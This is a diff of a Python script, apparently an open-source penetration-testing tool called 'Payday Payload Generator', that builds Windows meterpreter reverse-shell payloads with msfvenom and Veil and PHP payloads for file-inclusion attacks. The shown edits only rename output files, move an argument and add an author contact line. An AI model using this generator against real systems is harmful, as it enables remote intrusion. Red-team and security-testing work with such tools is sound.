@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# Author : Matt Lorentzen
-
+# Author  : Matt Lorentzen
+# Twitter : @lorentzenman
 
 import os, sys, time, argparse
 
@@ -104,9 +104,9 @@ def veil_payloads(ip, output_dir, move_payloads, veil_script, payload_port):
 	# start empty list to hold
 	payloads = []
 	# appends payloads with nested 3 value list for dynamic parm calling
-	payloads.append(["cs/meterpreter/rev_https",payload_port, "veil_rev_https"])
-	payloads.append(["c/meterpreter/rev_tcp",payload_port,"veil_rev_tcp_met"])
-	payloads.append(["c/meterpreter/rev_http_service",payload_port, "veil_rev_http_srv"])
+	payloads.append(["cs/meterpreter/rev_https",payload_port, "v_revhttps"])
+	payloads.append(["c/meterpreter/rev_tcp",payload_port,"v_revmet"])
+	payloads.append(["c/meterpreter/rev_http_service",payload_port, "v_revhttp_srv"])
 
 
 	print "Creating Veil Goodness"
@@ -250,11 +250,11 @@ def Main():
 	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
 	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
 	parser.add_argument("--msf", action="store_true", help='MSF Payloads > tcp/exe, tcp/http(s), exe-service, dll')
-	parser.add_argument("--port", help='Specify custom port for payloads. Defaults to 443')	
 	parser.add_argument("--php", action="store_true", help='Creates PHP payload as txt file for LFI/RFI')
 	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
 	parser.add_argument("--output", help="Specify new output directory.")
 	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')
+	parser.add_argument("--port", help='Specify custom port for payloads. Defaults to 443')	
 
 	# counts the supplied number of arguments and prints help if they are missing
 	if len(sys.argv)==1:
